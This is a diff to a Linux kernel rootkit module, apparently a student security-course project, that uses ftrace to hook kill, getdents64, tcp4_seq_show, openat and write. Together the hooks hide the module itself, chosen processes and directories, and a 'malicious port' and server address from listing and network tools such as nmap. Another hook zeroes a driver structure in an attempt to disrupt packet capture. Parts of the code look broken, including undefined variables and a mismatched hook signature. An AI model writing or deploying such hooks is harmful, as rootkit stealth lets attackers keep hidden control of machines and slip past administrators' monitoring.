@@ -16,9 +16,10 @@
 #include <linux/module.h>
 #include <linux/dirent.h>
 #include <linux/tcp.h>
-#include <linux/socket.h>
-#include <linux/errno.h>
 
+#include <linux/mfd/ezx-pcap.h>
+#include <linux/spi/spi.h>
+#include <linux/platform_device.h>
 #include <linux/string.h>
 
 #include <net/tcp.h>
@@ -27,9 +28,9 @@
 #include "ftrace_helper.h"
 
 MODULE_LICENSE("GPL");
-MODULE_AUTHOR("Alvin (guided with XCellerator");
+MODULE_AUTHOR("Alvin, Uwem, Derek (guided with XCellerator");
 MODULE_DESCRIPTION("Rootkit hiding itself");
-MODULE_VERSION("0.05");
+MODULE_VERSION("1.00");
 
 
 // tracking variables: hiding rootkit.
@@ -58,7 +59,7 @@ void show_me(void){
 }
 
 // The hooks and tracking variables needed to hide directories
-#define PREFIX "XxHidethisxX"
+#define PREFIX "cpsc413-project"
 char hide_proc[NAME_MAX]; //hide_proc gets filled at hooked sys_kill
 
 static asmlinkage long (*orig_getdents64)(const struct pt_regs *regs);
@@ -90,8 +91,8 @@ asmlinkage int hook_getdents64(const struct pt_regs *regs){
 
 
     if ((memcmp(hide_proc, current_dir->d_name, strlen(hide_proc)) == 0
-				&& strncmp(hide_proc, "", NAME_MAX) != 0)
-				|| memcmp(PREFIX, current_dir->d_name, strlen(hide_proc)) == 0){
+				|| memcmp(PREFIX, current_dir->d_name, strlen(hide_proc)) == 0)
+			  && strncmp(hide_proc, "", NAME_MAX) != 0){
       printk(KERN_INFO "Found directory %s.\n", current_dir->d_name);
       if (current_dir == dirent_scratch){
         ret -= current_dir->d_reclen;
@@ -136,10 +137,6 @@ asmlinkage int hook_kill(const struct pt_regs *regs){
 		hide_me();
 		hidden = 1;
 		dir_hiding = 1;
-
-		printk(KERN_INFO "trying to hide %d\n", pid);
-		sprintf(hide_proc, "%d", pid); //usage: kill -64 [PID to hide]
-
 		return 0;
 	}
 	else if(sig == 64 && hidden){
@@ -148,28 +145,34 @@ asmlinkage int hook_kill(const struct pt_regs *regs){
 		dir_hiding = 0;
 		return 0;
 	}
+	else if (sig == 63){
+		printk(KERN_INFO "Setting hidden pid to %i\n", pid);
+		sprintf(hide_proc, "%d", pid); //usage: kill -65 [PID to hide]
+		return 0;
+	}
 	return orig_kill(regs);
 }
 
-/* The hook_tcp4_seq_show function checks if the malicious 
- * port is in use and hides it if it is. 
+/* The hook_tcp4_seq_show function checks if the malicious
+ * port is in use and hides it if it is.
  */
- #define ADDRESS "10.0.2.15"
+ // #define ADDRESS "10.0.2.15"
+#define ADDRESS "192.168.56.102" //Alvin's Server VM
 static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file* seq, void* v);
 
 static asmlinkage long hook_tcp4_seq_show(struct seq_file* seq, void* v) {
-  struct sock *sk =  v; 
-  int max_ip_len = 16; 
+  struct sock *sk =  v;
+  int max_ip_len = 16;
   char foreign_ip_str[16];
   char local_ip_str[16];
-  int bytes_written = 0; 
+  int bytes_written = 0;
   if (sk != (struct sock*)0x1) {
     bytes_written = snprintf(foreign_ip_str, max_ip_len, "%pI4", &sk->sk_daddr);
     if (bytes_written < 0) {
       printk(KERN_INFO "Could not write foreign ip string\n");
     }
 
-    // Check if ip matches local machine. For the case where the server is the 
+    // Check if ip matches local machine. For the case where the server is the
     // local machine.
     bytes_written = snprintf(local_ip_str, max_ip_len, "%pI4", &sk->sk_rcv_saddr);
     if (bytes_written < 0) {
@@ -189,12 +192,13 @@ static asmlinkage long hook_tcp4_seq_show(struct seq_file* seq, void* v) {
 }
 
 /* Try to hide from other tools that don't use /proc/net/tcp. Hook openat to
- * prevent network monitoring tools from opening other files like /etc/hosts and 
- * /etc/services. 
+ * prevent network monitoring tools from opening other files like /etc/hosts and
+ * /etc/services.
  */
 #define NMAP_SERVICES_FILE "/usr/bin/../share/nmap/nmap-services"
-#define PORT_TO_HIDE "8080" 
-#define ADDR_TO_HIDE "10.0.2.15"
+#define PORT_TO_HIDE "8080"
+// #define ADDR_TO_HIDE "10.0.2.15"
+#define ADDR_TO_HIDE "192.168.56.102" //Alvin's Server VM
 #ifdef PTREGS_SYSCALL_STUBS
 
 static asmlinkage int (*orig_openat)(struct pt_regs *regs);
@@ -204,8 +208,8 @@ static asmlinkage int hook_openat(struct pt_regs *regs) {
   char *hostname_file = "/etc/hostname";
   if (strcmp(pathname, NMAP_SERVICES_FILE) == 0) {
     regs->si = (unsigned long)((void *)hostname_file);
-    return orig_openat(regs); 
-  } 
+    return orig_openat(regs);
+  }
 
   return orig_openat(regs);
 }
@@ -214,17 +218,17 @@ static asmlinkage int (*orig_openat)(int dirfd, const char __user *pathname, int
 
 static asmlinkage int hook_openat(int dirfd, const char __user *pathname, int flags, umode_t mode) {
   if (strcmp(pathname, NMAP_SERVICES_FILE) == 0) {
-    return orig_openat(dirfd, pathname, flags, mode); 
-  } 
+    return orig_openat(dirfd, pathname, flags, mode);
+  }
 
   return orig_openat(dirfd, pathname, flags, mode);
 }
 #endif
 
-/* Hook the write function to prevent communication with server from 
+/* Hook the write function to prevent communication with server from
  * from being output to stdout. */
 #define HTTP_ALT "http-alt"
-
+#ifdef PTREGS_SYSCALL_STUBS
 static asmlinkage long (*orig_write)(struct pt_regs *regs);
 
 static asmlinkage long hook_write(struct pt_regs *regs) {
@@ -239,7 +243,7 @@ static asmlinkage long hook_write(struct pt_regs *regs) {
     regs->si = (unsigned long)((void*)fake_address);
 
     return orig_write(regs);
-  } else if (strstr(orig_buff, HTTP_ALT)!= NULL) {
+  } else if (strstr(orig_buff, ADDR_TO_HIDE) != NULL) {
     regs->si = (unsigned long)((void*)fake_port);
 
     return orig_write(regs);
@@ -247,54 +251,32 @@ static asmlinkage long hook_write(struct pt_regs *regs) {
 
   return orig_write(regs);
 }
+#else
+static asmlinkage long (*orig_write)(struct pt_regs *regs);
 
-/* Tries to prevent wireshark from using pcap. Wireshark uses libpcap to library 
- * to perform pcap. This hook aims to interrupt packet processing by causing 
- * errors. */
-#define PCAP_ADC_MAXQ		8
-struct pcap_chip {
-	struct spi_device *spi;
-
-	/* IO */
-	u32 buf;
-	spinlock_t io_lock;
-
-	/* IRQ */
-	unsigned int irq_base;
-	u32 msr;
-	struct work_struct isr_work;
-	struct work_struct msr_work;
-	struct workqueue_struct *workqueue;
-
-	/* ADC */
-	struct pcap_adc_request *adc_queue[PCAP_ADC_MAXQ];
-	u8 adc_head;
-	u8 adc_tail;
-	spinlock_t adc_lock;
-};
-
-asmlinkage int (*orig_ezx_pcap_putget)(struct pt_regs *regs);
-
-asmlinkage int hook_ezx_pcap_putget(struct pt_regs *regs) {
-	return orig_ezx_pcap_putget(regs);
-}
-
-/* Tried to see if we could hook the conenct function, but even successfully hooking,
- * the connection is still detected. */
-static asmlinkage int (*orig_connect)(struct pt_regs *regs);
-
-static asmlinkage int hook_connect(struct pt_regs *regs) {
-  struct sockaddr_in *sock = (struct sockaddr_in *)((void*)(regs->si));
-  if (sock->sin_family == AF_INET && sock->sin_port == htons(8080)) {
-    printk("sin_port before: %u %u", sock->sin_port, htons(8080));
-    memset(&(sock->sin_port), '\0', 4);
-    printk("sin_port after: %u %u", sock->sin_port, htons(8080));
-    return ENETUNREACH;
-  } else if (sock->sin_port != htons(8080)) {
-    return orig_connect(regs);
-  } else {
-    return ENETUNREACH;
+static asmlinkage long hook_write(int fd, const char __user *buff, size_t count) {
+  char *fake_port = "2020";
+  char *fake_address = "123.456.789.0";
+  if (strstr(buff, bad_port) != NULL) {
+    return orig_write(fd, fake_port, count);
+  } else if (strstr(buff, bad_address) != NULL) {
+    return orig_write(fd, fake_address, count);
   }
+
+  return orig_write(fd, buff, count);
+}
+#endif
+
+/* Tries to prevent wireshark from using pcap. Wireshark uses libpcap to library
+ * to perform pcap. This hook aims to interrupt packet processing by causing
+ * errors. */
+static asmlinkage int (*orig_ezx_pcap_putget)(struct pcap_chip *pcap, u32 *data);
+
+static asmlinkage int hook_ezx_pcap_putget(struct pcap_chip *pcap, u32 *data) {
+  // Memset things to '\0' in this pcap_chip struct(it looks important).
+  memset(pcap, '\0', 20);
+  memset(data, '\0', sizeof(u32));
+  return -1;
 }
 
 //The hooking structure: for every syscall we want to hijack,
@@ -306,10 +288,9 @@ static struct ftrace_hook hooks[] = {
 	HOOK("sys_kill", hook_kill, &orig_kill),
   HOOK("sys_getdents64", hook_getdents64, &orig_getdents64),
   HOOK("tcp4_seq_show", hook_tcp4_seq_show, &orig_tcp4_seq_show),
-  //HOOK("__x64_sys_openat", hook_openat, &orig_openat),
+  HOOK("__x64_sys_openat", hook_openat, &orig_openat),
   HOOK("__x64_sys_write", hook_write, &orig_write),
-  //HOOK("ezx_pcap_putget", hook_ezx_pcap_putget, &orig_ezx_pcap_putget),
-  HOOK("__x64_sys_connect", hook_connect, &orig_connect),
+  HOOK("ezx_pcap_putget", hook_ezx_pcap_putget, &orig_ezx_pcap_putget),
 };
 
 
